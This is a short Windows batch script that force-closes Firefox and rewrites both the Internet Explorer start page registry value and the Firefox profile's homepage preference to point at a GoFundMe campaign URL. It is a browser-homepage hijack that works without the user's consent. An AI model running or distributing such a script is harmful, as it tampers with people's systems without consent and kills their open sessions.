@Echo off
REG ADD \"HKCU\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\MAIN\\\" /V \"START PAGE\" /D \"https://www.gofundme.com/stefankarlstefansson/\" /F

taskkill /im firefox.exe* /f

cd /D "%APPDATA%\Mozilla\Firefox\Profiles"
cd *.default
set ffile=%cd%
echo user_pref("browser.startup.homepage", "https://www.gofundme.com/stefankarlstefansson");>>"%ffile%\prefs.js"
set ffile=
cd %windir%
exit
